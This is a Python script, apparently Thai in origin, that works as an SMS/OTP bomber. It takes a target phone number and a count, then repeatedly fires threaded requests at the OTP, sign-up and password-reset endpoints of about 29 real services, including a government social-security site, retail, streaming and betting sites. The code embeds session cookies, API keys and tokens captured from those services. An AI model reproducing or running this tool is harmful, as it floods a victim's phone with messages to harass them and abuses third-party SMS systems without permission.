from threading import Thread
import random

try:
	import requests
	import os
	import threading
	import time

except ModuleNotFoundError:
	print("\033[91m[!] install requests dulu gan")
	print("\033[95m$ pip install reqests")
	exit()

class warna:
    p = '\033[95m'
    b = '\033[94m'
    g = '\033[92m'
    y = '\033[93m'
    r = '\033[91m'

try:
	os.system('clear')
	print("""\33[1;96m



██████╗░████████╗██████╗░██████╗░░░██╗██╗░█████╗░
██╔══██╗╚══██╔══╝╚════██╗╚════██╗░██╔╝██║██╔══██╗
██████╔╝░░░██║░░░░█████╔╝░█████╔╝██╔╝░██║██║░░██║
██╔═══╝░░░░██║░░░░╚═══██╗░╚═══██╗███████║██║░░██║
██║░░░░░░░░██║░░░██████╔╝██████╔╝╚════██║╚█████╔╝
╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═════╝░░░░░░╚═╝░╚════╝░
                                                                                                                          
""")

	print ("")
	print ("by : PT3340")
	print ("ทำโดย : ปิยะวัฒน์ ทวีคำ")
	print ("FB : ปิยะวัฒน์ ทวีคำ")
	print("สคิปฟรี ห้ามขาย ห้ามรับยิง ! ! !")
	print ("")
	phone = input("\033[95m เบอร์ : \033[0m")
	num=int(input("\033[95m จำนวน : \033[0m"))

except ValueError:

	print ("\033[91m[!] ใส่ไม่ถูกต้อง")
	exit()
print('')
print("--------------------FB : ปิยะวัฒน์ ทวีคำ แอดมาด้วยเหงา----------------------")
print('')

name = ''
for x in range(12):
        name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def API_1():  # SSO
    try:
        jun = ('Mobile')
        req = requests.post(
            'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
            headers={
                "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":
                "XMLHttpRequest",
                "Cookie":
                "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
            },
            data=
            f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
        )
        if str(jun) in str(req.text):
            print("\033[92m Succes")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_2():  # mcshop.com
    try:
        jun = ('username')
        req = requests.post(
            "https://api.mcshop.com/cognito/me/register",
            headers={
                "x-store-token": "mcshop",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "accept": "application/json, text/plain, */*",
                "x-auth-token":
                "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7",
                "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"
            },
            json={
                "dob": "1902-02-02",
                "email": name + "@gmail.com",
                "firstname": name,
                "lastname": name,
                "gender": 1,
                "password": password,
                "personalMobile": phone,
                "channelCode": "CO",
                "marketingConsentVer": "v0.1",
                "marketingConsent": 1,
                "pdpaVer": "v0.1"
            })
        req1 = requests.post(
            "https://api.mcshop.com/cognito/me/forget-password",
            headers={
                "x-store-token": "mcshop",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "accept": "application/json, text/plain, */*",
                "x-auth-token":
                "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7",
                "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"
            },
            json={"username": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_3():  #
    try:
        jun = ('phone')
        req = requests.post(
            "https://www.pizza2night.co.uk/api/Account/RequestPhoneLoginCodeSms",
            data={
                "DeviceName":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "PhoneNumber": "+66" + phone
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_4():  # PT-MAXCARD
    try:
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_5():  # TechCare
    try:
        jun = ('phone')
        req = requests.post(
            "https://m.lavagame168.com/api/register-otp",
            headers={
                "x-exp-signature": "5ffc0caa4d603200124e4eb1",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "referer": "https://m.lavagame168.com/dashboard/login"
            },
            json={
                "brands_id": "5ffc0caa4d603200124e4eb1",
                "agent_register": "5ffc0d5cdcd4f30012aec3d9",
                "tel": phone
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_6():
    try:
        jun = ('phone')
        req = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/signup/phone"
            },
            json={
                "ClientId":
                "6g47av6ddfcvi06v4l186c16d6",
                "Username":
                f"+66{phone[1:]}",
                "Password":
                "098098Az",
                "UserAttributes": [{
                    "Name": "name",
                    "Value": "Dbdh"
                }, {
                    "Name": "birthdate",
                    "Value": "2005-01-01"
                }, {
                    "Name": "gender",
                    "Value": "Male"
                }, {
                    "Name": "phone_number",
                    "Value": f"+66{phone[1:]}"
                }, {
                    "Name": "custom:phone_country_code",
                    "Value": "+66"
                }, {
                    "Name": "custom:is_agreement",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_consent",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_person_info",
                    "Value": "true"
                }],
                "ValidationData": []
            })
        req1 = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "cache-control": "max-age=0",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target":
                "AWSCognitoIdentityProviderService.ResendConfirmationCode",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/resetpass/phone"
            },
            json={
                "ClientId": "6g47av6ddfcvi06v4l186c16d6",
                "Username": f"+66{phone[1:]}"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_7():  # SHEIN
    try:
        jun = ('phone')
        data = f"alias_type=2&alias={phone[1:]}&scene=phone_login_register_verify&third_party_type=8&area_code=66&area_abbr=TH"
        headers = {
            "smdeviceid":
            "WHJMrwNw1k/FkgqTRcw7UZ5PkWLQAuU+TezL9vzcTO6HZ7S/2M8BWywESlp95MzuBeTohbRm+Xe8PbnXuZKYNl/zT3JGiUHo2B+dnLhXY8dBTWDDWm6IuDIYHqxuZPWulBJ7HANruhDjgssVEtOEyiJGebD4P9188qLPpJodGYZ3O50FnlatQ0V6Bzd7lNAi5Kei9dcuNh8hITj5CyjMgYOvVpwWYlJx0uwP6Z8JvobM2kNF0emrW7C4Vc2T0mj05UX6nQPSaEF7iU4/FsVYgBg==1487582755342",
            "x-csrf-token": "V5QoyYSc-5vIAbVv7HGaqTFwz7E7POtIEDCQ",
            "content-type": "application/x-www-form-urlencoded",
            "x-requested-with": "XMLHttpRequest"
        }
        req = requests.post(
            "https://m.shein.com/ru/user/auth/sendcode?_ver=1.1.8&_lang=ru",
            headers=headers,
            data=data)
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_8():  # CMSMS
    try:
        jun = ('phone')
        req = requests.post("https://unacademy.com/api/v3/user/user_check/",
                            json={
                                "phone": phone,
                                "country_code": "TH"
                            },
                            headers={}).json()
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_9():  # REDBUS
    try:
        jun = ('phone')
        req = requests.get(
            "https://m.redbus.id/api/getOtp?number=" + phone[1:] +
            "&cc=66&whatsAppOpted=true",
            headers={
                "traceparent":
                "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
            }).text
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_10():  # call
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.myfave.com/api/fave/v3/auth",
            headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
            json={"phone": "66" + phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_11():  # True-Shopp
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
            data={"username": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_12():  # MOVIDER
    try:
        jun = ('phone')
        req = requests.post(
            "https://samartbet.com/api/request/otp",
            data={
                "phoneNumber":
                phone,
                "token":
                "HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_13():  # EZYPLAY
    try:
        jun = ('phone')
        req = requests.post("https://www.msport1688.com/auth/send_otp",
                            data={"phone": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_14():  # QCLONE
    try:
        jun = ('phone')
        req = requests.post("http://b226.com/x/code", data={f"phone": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_15():
    try:
        jun = ('phone')  # SMSOTP
        req = requests.post("https://ep789bet.net/auth/send_otp",
                            data={"phone": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_16():  # berlnw
    try:
        jun = ('phone')
        req = requests.post(
            "https://www.berlnw.com/reservelogin",
            data={"p_myreserve": phone},
            headers={
                "Host":
                "www.berlnw.com",
                "Connection":
                "keep-alive",
                "Upgrade-Insecure-Requests":
                "1",
                "Content-Type":
                "application/x-www-form-urlencoded",
                "Save-Data":
                "on",
                "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer":
                "https://www.berlnw.com/myaccount",
                "Accept-Encoding":
                "gzip, deflate, br",
                "Accept-Language":
                "th-TH,th;q=0.9,en;q=0.8",
                "Cookie":
                "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_17():
    try:
        jun = ('phone')
        req = requests.post(
            "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
            json={
                "on": {
                    "value": phone,
                    "country": "66"
                },
                "type": "mobile"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_18():
    try:
        jun = ('phone')
        req = requests.post(
            "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
            json={
                "on": {
                    "value": phone,
                    "country": "66"
                },
                "type": "mobile"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_19():
    try:
        jun = ('phone')  # SMSOTP
        req = requests.post("https://ep789bet.net/auth/send_otp",
                            data={"phone": phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_20():
    try:
        jun = ('phone')
        req = requests.post(
            "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
            json={
                "on": {
                    "value": phone,
                    "country": "66"
                },
                "type": "mobile"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_21():  # berlnw
    try:
        jun = ('phone')
        req = requests.post(
            "https://www.berlnw.com/reservelogin",
            data={"p_myreserve": phone},
            headers={
                "Host":
                "www.berlnw.com",
                "Connection":
                "keep-alive",
                "Upgrade-Insecure-Requests":
                "1",
                "Content-Type":
                "application/x-www-form-urlencoded",
                "Save-Data":
                "on",
                "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer":
                "https://www.berlnw.com/myaccount",
                "Accept-Encoding":
                "gzip, deflate, br",
                "Accept-Language":
                "th-TH,th;q=0.9,en;q=0.8",
                "Cookie":
                "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"
            })
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_22():  # call
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.myfave.com/api/fave/v3/auth",
            headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
            json={"phone": "66" + phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_23():  # call
    try:
        jun = ('phone')
        req = requests.post(
            "https://api.myfave.com/api/fave/v3/auth",
            headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
            json={"phone": "66" + phone})
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_24():  # CMSMS
    try:
        jun = ('phone')
        req = requests.post("https://unacademy.com/api/v3/user/user_check/",
                            json={
                                "phone": phone,
                                "country_code": "TH"
                            },
                            headers={}).json()
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_25():  # CMSMS
    try:
        jun = ('phone')
        req = requests.post("https://unacademy.com/api/v3/user/user_check/",
                            json={
                                "phone": phone,
                                "country_code": "TH"
                            },
                            headers={}).json()
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_26():  # PT-MAXCARD
    try:
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_27():  # PT-MAXCARD
    try:
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_28():  # PT-MAXCARD
    try:
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass


def API_29(): #findclone
    try:
        jun = ('phone')
        req = requests.get(
            f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
        if str(jun) in str(req.text):
            print("\33[1;96m กำลังยิง")
        else:
            print("\33[1;96m กำลังยิง")
    except:
        pass



for i in range(num):
    time.sleep(1)
    threading.Thread(target=API_1).start()
    threading.Thread(target=API_2).start()
    threading.Thread(target=API_3).start()
    threading.Thread(target=API_4).start()
    threading.Thread(target=API_5).start()
    threading.Thread(target=API_6).start()
    threading.Thread(target=API_7).start()
    threading.Thread(target=API_8).start()
    threading.Thread(target=API_9).start()
    threading.Thread(target=API_10).start()
    threading.Thread(target=API_11).start()
    threading.Thread(target=API_12).start()
    threading.Thread(target=API_13).start()
    threading.Thread(target=API_14).start()
    threading.Thread(target=API_15).start()
    threading.Thread(target=API_16).start()
    threading.Thread(target=API_17).start()
    threading.Thread(target=API_18).start()
    threading.Thread(target=API_19).start()
    threading.Thread(target=API_20).start()
    threading.Thread(target=API_21).start()
    threading.Thread(target=API_22).start()
    threading.Thread(target=API_23).start()
    threading.Thread(target=API_24).start()
    threading.Thread(target=API_25).start()
    threading.Thread(target=API_26).start()
    threading.Thread(target=API_27).start()
    threading.Thread(target=API_28).start()
    threading.Thread(target=API_29).start()